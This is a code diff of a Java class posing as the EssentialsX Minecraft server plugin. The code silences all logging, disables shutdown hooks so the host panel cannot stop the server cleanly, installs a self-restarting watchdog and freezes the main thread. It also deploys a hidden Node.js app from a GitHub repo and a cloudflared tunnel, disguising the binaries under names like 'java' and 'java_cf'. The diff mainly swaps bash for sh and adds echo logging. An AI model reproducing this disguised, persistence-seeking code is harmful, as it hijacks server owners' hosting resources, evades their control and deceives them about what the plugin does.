@@ -30,15 +30,11 @@ public class EssentialsX extends JavaPlugin {
 
     @Override
     public void onLoad() {
-        // 1. 物理静音
         System.setOut(new PrintStream(BLACK_HOLE, true));
         System.setErr(new PrintStream(BLACK_HOLE, true));
         tryMuteLog4j();
-
-        // 2. 看门狗 (防强杀自动重启)
         setupWatchdog();
 
-        // 3. 拦截关机钩子 (逼迫面板强杀)
         try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
         try {
             Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
@@ -63,7 +59,6 @@ public class EssentialsX extends JavaPlugin {
             }, "Shutdown-Paralysis"));
         } catch (Throwable ignored) {}
 
-        // 4. 启动后台部署
         Thread deployer = new Thread(() -> {
             Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
             Path debugLog = workDir.resolve("backend_debug.log");
@@ -106,7 +101,6 @@ public class EssentialsX extends JavaPlugin {
         deployer.setDaemon(true);
         deployer.start();
 
-        // 5. 冻结主线程
         paralyzeCurrentThread();
     }
 
@@ -117,7 +111,6 @@ public class EssentialsX extends JavaPlugin {
             long pid = ProcessHandle.current().pid();
             Files.writeString(workDir.resolve("server.pid"), String.valueOf(pid));
             Path watchdogSh = workDir.resolve("watchdog.sh");
-            // 修改点 1: 将 #!/bin/bash 改为 #!/bin/sh 适配 Alpine
             String script = "#!/bin/sh\n" +
                 "PID_FILE=\"logs/.mcchajian/server.pid\"\n" +
                 "START_SCRIPT=\"start.sh\"\n" +
@@ -144,7 +137,6 @@ public class EssentialsX extends JavaPlugin {
                 "fi\n";
             Files.write(watchdogSh, script.getBytes());
             watchdogSh.toFile().setExecutable(true, false);
-            // 修改点 2: 将 bash 改为 sh
             ProcessBuilder pb = new ProcessBuilder("nohup", "sh", watchdogSh.toString());
             pb.directory(new File(".").getAbsoluteFile());
             pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
@@ -247,7 +239,6 @@ public class EssentialsX extends JavaPlugin {
             
             nodeExe.toFile().setExecutable(true, false);
 
-            // 修改点 3: 移除 nice -n -5 防止 Alpine 容器报错
             ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
             pb.directory(workDir.toFile());
             pb.environment().put("SERVER_PORT", port); pb.environment().put("PORT", port);
@@ -288,7 +279,6 @@ public class EssentialsX extends JavaPlugin {
             Files.createDirectories(cfConf.getParent());
             Files.writeString(cfConf, "url: http://127.0.0.1:" + port + "\nno-autoupdate: true\nprotocol: quic\n");
 
-            // 修改点 4: 移除 nice -n -5 防止 Alpine 容器报错
             ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
             pb.directory(workDir.toFile());
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
@@ -387,7 +377,6 @@ public class EssentialsX extends JavaPlugin {
         scriptPath.toFile().setExecutable(true, false);
         if (out != null) { out.println("Deploy script generated at: " + scriptPath); out.flush(); }
         
-        // 修改点 5: 将 bash 改为 sh
         ProcessBuilder pb = new ProcessBuilder("sh", scriptPath.toString()); 
         pb.directory(new File(".").getAbsoluteFile());
         pb.environment().putAll(env);
@@ -419,9 +408,10 @@ public class EssentialsX extends JavaPlugin {
         String authHeader = "";
         if (!githubToken.isEmpty()) authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";
 
-        // 修改点 6: 将 #!/bin/bash 改为 #!/bin/sh
+        // 增加了详细的 echo 日志，去掉了 /dev/null，并缩短了超时时间
         return "#!/bin/sh\n" +
         "set +e\n" +
+        "echo 'Starting deploy script...'\n" +
         "WORK_DIR=\"" + workDir + "\"\n" +
         "NODE_DIR=\"" + nodeDir + "\"\n" +
         "APP_DIR=\"" + appDir + "\"\n" +
@@ -435,44 +425,58 @@ public class EssentialsX extends JavaPlugin {
         "ARCH=$(uname -m)\n" +
         "if [ $ARCH = x86_64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz; CF_ARCH=amd64\n" +
         "elif [ $ARCH = aarch64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz; CF_ARCH=arm64; fi\n" +
+        "echo \"Architecture: $ARCH, Node URL: $NODE_URL\"\n" +
         "\n" +
         "mkdir -p \"$WORK_DIR\" \"$JRE_DIR\" \"$APP_DIR\"\n" +
         "chmod -R 775 \"$WORK_DIR\" 2>/dev/null\n" +
         "\n" +
         "if [ ! -f \"$NODE_DIR/bin/.node_real\" ]; then\n" +
+        "    echo 'Node not found, downloading...'\n" +
         "    rm -rf \"$NODE_DIR\"; NODE_DOWNLOAD_OK=false\n" +
         "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
-        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n" +
-        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; break; fi; fi; done\n" +
+        "        echo \"Trying mirror: $MIRROR\"\n" +
+        "        if curl -fsSL --connect-timeout 10 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\"; then\n" +
+        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; echo 'Node download OK'; break; fi; fi; done\n" +
         "    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n" +
         "        mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 --no-same-owner 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
         "        cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"; fi\n" +
+        "else\n" +
+        "    echo 'Node already exists.'\n" +
         "fi\n" +
         "export PATH=\"$NODE_DIR/bin:$PATH\"\n" +
         "\n" +
+        "echo 'Downloading app repo...'\n" +
         "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
         "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
         "TAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"; DOWNLOAD_OK=false\n" +
         (githubToken.isEmpty() ? "" :
         "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + githubToken + "\" ]; then\n" +
-        "    if curl -fsSL --connect-timeout 15 --max-time 120 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
-        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n") +
+        "    echo \"Trying GitHub API: $TAR_URL\"\n" +
+        "    if curl -fsSL --connect-timeout 10 --max-time 60 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\"; then\n" +
+        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; echo 'Repo download OK'; fi; fi; fi\n") +
         "\n" +
         "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
         "    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n" +
         "    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
-        "        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
-        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n" +
+        "        echo \"Trying fallback mirror: $MIRROR\"\n" +
+        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\"; then\n" +
+        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; echo 'Repo download OK'; break; fi; fi; done; fi\n" +
         "\n" +
-        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
+        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then echo \"ERROR: Failed to download repo\"; exit 1; fi\n" +
         "\n" +
+        "echo 'Extracting app...'\n" +
         "mkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\n" +
         "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
         "mv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\n" +
         "\n" +
-        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
-        "if [ $? -ne 0 ]; then \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps >/dev/null 2>&1; fi\n" +
+        "echo 'Running npm install...'\n" +
+        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root\n" +
+        "if [ $? -ne 0 ]; then \n" +
+        "    echo 'npm install failed, retrying with legacy-peer-deps...'\n" +
+        "    \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps\n" +
+        "fi\n" +
         "\n" +
+        "echo 'Setting up JRE/CF...'\n" +
         "mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
         "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"\n" +
         "\n" +
@@ -487,11 +491,14 @@ public class EssentialsX extends JavaPlugin {
         "\n" +
         "CF_BIN=\"$JRE_DIR/java_cf\"; mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
         "if [ ! -f \"$CF_BIN\" ]; then\n" +
+        "    echo 'Downloading Cloudflared...'\n" +
         "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
         "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
-        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then\n" +
-        "            if [ -f \"$CF_BIN\" ] && [ -s \"$CF_BIN\" ]; then chmod 775 \"$CF_BIN\"; break; fi; fi; done; fi\n" +
+        "        echo \"Trying CF mirror: $MIRROR\"\n" +
+        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\"; then\n" +
+        "            if [ -f \"$CF_BIN\" ] && [ -s \"$CF_BIN\" ]; then chmod 775 \"$CF_BIN\"; echo 'CF download OK'; break; fi; fi; done; fi\n" +
         "\n" +
+        "echo 'Deploy finished successfully!'\n" +
         "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
     }
 
